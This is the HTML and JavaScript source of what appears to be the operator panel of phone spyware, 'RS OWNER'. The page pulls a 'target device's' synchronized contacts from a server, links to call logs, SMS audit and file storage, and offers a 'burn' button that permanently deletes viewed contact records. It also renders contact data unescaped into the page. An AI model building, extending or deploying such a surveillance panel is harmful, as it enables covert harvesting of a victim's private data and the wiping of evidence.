<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Address Book & Contacts - RS OWNER</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <style>
        /* =========================================================
           RS PHONE - ZERO-LAG FLAT ARCHITECTURE (INJECTED STYLE)
           ========================================================= */
        :root {
            --bg-main: #121212;
            --bg-card: #1e1e1e;
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent-cyan: #00f0ff;
            
            /* Flat Status Colors */
            --color-dark: #2c3e50;
            --color-red: #e74c3c;
            --color-green: #2ecc71;
            --color-blue: #2980b9;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
        }

        body {
            background-color: var(--bg-main);
            color: var(--text-main);
            min-height: 100vh;
            padding: 15px;
            padding-bottom: 40px;
            overflow-x: hidden;
        }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: rgba(0,0,0,0.1); }
        ::-webkit-scrollbar-thumb { background: #333; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--color-green); }

        /* Sidebar & Layout */
        .app-container { display: flex; min-height: 100vh; gap: 20px; }
        .sidebar { width: 260px; background: var(--bg-card); padding: 20px; border-radius: 16px; border: 1px solid #2c2c2e; display: flex; flex-direction: column; gap: 25px; }
        .sidebar-brand { display: flex; align-items: center; gap: 10px; font-size: 18px; font-weight: 800; letter-spacing: 1px; color: var(--text-main); }
        .sidebar-menu { list-style: none; display: flex; flex-direction: column; gap: 8px; }
        .sidebar-menu li a { display: flex; align-items: center; gap: 12px; padding: 12px 16px; color: var(--text-muted); text-decoration: none; border-radius: 8px; font-weight: 600; font-size: 14px; transition: all 0.2s; }
        .sidebar-menu li.active a, .sidebar-menu li a:hover { background: rgba(39, 174, 96, 0.1); color: var(--color-green); }
        
        .main-content { flex: 1; display: flex; flex-direction: column; gap: 20px; }
        .topbar { display: flex; justify-content: space-between; align-items: center; padding-bottom: 15px; border-bottom: 1px solid #2c2c2e; }
        .glass-panel { background: var(--bg-card); border: 1px solid #2c2c2e; border-radius: 16px; padding: 25px; }

        /* =========================================================
           CONTACTS SPECIFIC STYLES
           ========================================================= */
        .search-box {
            width: 100%;
            padding: 14px 18px;
            background: #141416;
            border: 1px solid #333;
            color: white;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 15px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        .search-box:focus { outline: none; border-color: var(--color-green); box-shadow: 0 0 10px rgba(39, 174, 96, 0.2); }

        .contact-row {
            background: rgba(255,255,255,0.03); 
            padding: 16px 20px; 
            border-radius: 10px; 
            margin-bottom: 10px; 
            border-left: 4px solid var(--color-green);
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            border-top: 1px solid transparent;
            border-right: 1px solid transparent;
            border-bottom: 1px solid transparent;
            transition: all 0.2s;
        }
        .contact-row:hover {
            background: rgba(255,255,255,0.06);
            border-color: rgba(39, 174, 96, 0.4);
            transform: translateX(4px);
        }

        .contact-name { font-size: 1.1rem; font-weight: 700; letter-spacing: 0.5px; color: #fff; }
        .contact-phone { color: var(--color-green); font-family: monospace; font-size: 1.05rem; font-weight: 600; letter-spacing: 0.5px; }

        .btn-burn {
            background: rgba(231, 76, 60, 0.15); 
            color: #e74c3c; 
            padding: 12px 24px; 
            border: 1px solid rgba(231, 76, 60, 0.3); 
            border-radius: 6px; 
            cursor: pointer; 
            font-weight: 800; 
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        .btn-burn:hover { background: rgba(231, 76, 60, 0.8); color: white; }

        .data-list-container {
            max-height: 65vh;
            overflow-y: auto;
            padding-right: 10px;
        }
    </style>
</head>
<body>
    <div class="app-container">
        <!-- Sidebar Unified Navigation -->
        <div class="sidebar">
            <div class="sidebar-brand">
                <i data-lucide="shield" style="color: var(--color-green);"></i>
                <span>RS OWNER</span>
            </div>
            <ul class="sidebar-menu">
                <li><a href="/dashboard"><i data-lucide="layout-dashboard"></i> Overview</a></li>
                <li><a href="/communication.html"><i data-lucide="message-circle"></i> Comm Hub</a></li>
                <li class="active"><a href="/contacts"><i data-lucide="book-open"></i> Address Book</a></li>
                <li><a href="/calls"><i data-lucide="phone"></i> Call Logs</a></li>
                <li><a href="/messages"><i data-lucide="message-square"></i> SMS Audit</a></li>
                <li><a href="/files"><i data-lucide="folder-open"></i> Storage</a></li>
            </ul>
        </div>

        <!-- Main Content Core Viewspace -->
        <main class="main-content">
            <header class="topbar">
                <div>
                    <h2 style="font-weight: 800; letter-spacing: 1px; text-transform: uppercase; color: var(--color-green);">Live Address Book</h2>
                    <p style="color: #888; font-size: 0.85rem; margin-top: 4px;">Synchronized contacts matrix from the target device.</p>
                </div>
            </header>

            <div class="glass-panel">
                <!-- Search Filter -->
                <input type="text" id="search-input" class="search-box" placeholder="Search by name or number..." onkeyup="filterContacts()">

                <!-- Target injection container node -->
                <div class="data-list-container" id="contacts-list">
                    <p id="loading-text" style="color: #888; font-style: italic; text-align: center; padding: 30px;">Establishing secure connection... Fetching contacts...</p>
                </div>
                
                <!-- Pagination Controls Container -->
                <div id="pagination-controls" style="margin-top: 20px; text-align: center;"></div>
            </div>
        </main>
    </div>

    <!-- EMBEDDED JAVASCRIPT LOGIC -->
    <script>
        // Init Icons
        document.addEventListener('DOMContentLoaded', () => {
            if (window.lucide) window.lucide.createIcons();
        });

        // 🚀 LIVE SEARCH FILTER SCRIPT
        function filterContacts() {
            let input = document.getElementById('search-input').value.toLowerCase();
            let list = document.getElementById('contacts-list');
            let items = list.getElementsByClassName('contact-row');

            for (let i = 0; i < items.length; i++) {
                let text = items[i].innerText.toLowerCase();
                if (text.indexOf(input) > -1) {
                    items[i].style.display = "flex";
                } else {
                    items[i].style.display = "none";
                }
            }
        }

        // 🚀 CONTACTS ENGINE CLASS
        class ContactsEngine {
            constructor() {
                this.activeDeviceId = localStorage.getItem('active_device_id');
                this.currentContactsIds = []; 
                this.init();
            }

            async init() {
                const container = document.getElementById('contacts-list');
                if (!container) return;

                if (!this.activeDeviceId) {
                    container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 30px; font-weight: bold;">Target Device ID missing. Please select a device from Dashboard.</p>';
                    return;
                }
                
                this.fetchContacts();
            }

            async fetchContacts() {
                const token = localStorage.getItem('owner_token');
                const container = document.getElementById('contacts-list');
                const controls = document.getElementById('pagination-controls');
                
                container.innerHTML = '<p style="color:#aaa; text-align:center; padding: 30px;">Loading secure contacts stream...</p>';
                controls.innerHTML = '';

                try {
                    const res = await fetch(`/api/contacts?device_id=${this.activeDeviceId}`, {
                        headers: { 'Authorization': `Bearer ${token}` }
                    });
                    const result = await res.json();

                    if (result.status === 'success') {
                        if (result.data.length === 0) {
                            container.innerHTML = '<p style="color:#aaa; text-align:center; padding: 30px;">No contacts available. Waiting for device sync payload...</p>';
                            return;
                        }

                        // Store IDs in memory to burn them on next page request
                        this.currentContactsIds = result.data.map(c => c.id);

                        container.innerHTML = result.data.map(c => `
                            <div class="contact-row">
                                <strong class="contact-name">${c.name}</strong>
                                <span class="contact-phone">${c.phone_number}</span>
                            </div>
                        `).join('');

                        // If exactly 50 contacts, generate the Burn & Load Next button
                        if (result.data.length === 50) {
                            controls.innerHTML = `
                                <button id="next-chunk-btn" class="btn-burn">
                                    <i data-lucide="flame" style="width: 16px; height: 16px;"></i> Delete These & Load Next 50
                                </button>
                            `;
                            if (window.lucide) window.lucide.createIcons();
                            document.getElementById('next-chunk-btn').addEventListener('click', () => this.loadNextPageAndBurn());
                        }
                    }
                } catch (e) {
                    console.error("Contacts Fetch Error:", e);
                    container.innerHTML = '<p style="color: #e74c3c; text-align: center; padding: 30px;">Network Error: Failed to fetch contacts.</p>';
                }
            }

            async loadNextPageAndBurn() {
                const isConfirmed = confirm("WARNING: This will permanently wipe these 50 contacts from the cloud database to load the next chunk. Proceed?");
                if (!isConfirmed) return;

                const token = localStorage.getItem('owner_token');
                const nextBtn = document.getElementById('next-chunk-btn');
                if (nextBtn) {
                    nextBtn.innerHTML = '<i data-lucide="loader" style="width: 16px; height: 16px;" class="lucide-spin"></i> Burning old data...';
                    if (window.lucide) window.lucide.createIcons();
                }

                try {
                    // Burn current 50 contacts
                    if (this.currentContactsIds.length > 0) {
                        await fetch('/api/contacts/burn', {
                            method: 'POST',
                            headers: { 
                                'Authorization': `Bearer ${token}`, 
                                'Content-Type': 'application/json' 
                            },
                            body: JSON.stringify({
                                device_id: this.activeDeviceId,
                                contact_ids: this.currentContactsIds
                            })
                        });
                    }

                    // Fetch next batch
                    this.fetchContacts();

                } catch (e) {
                    console.error("Burn Engine Error:", e);
                    alert("Failed to process the next chunk.");
                    if (nextBtn) nextBtn.innerHTML = '<i data-lucide="flame"></i> Delete These & Load Next 50';
                }
            }
        }

        document.addEventListener('DOMContentLoaded', () => new ContactsEngine());
    </script>
</body>
</html>
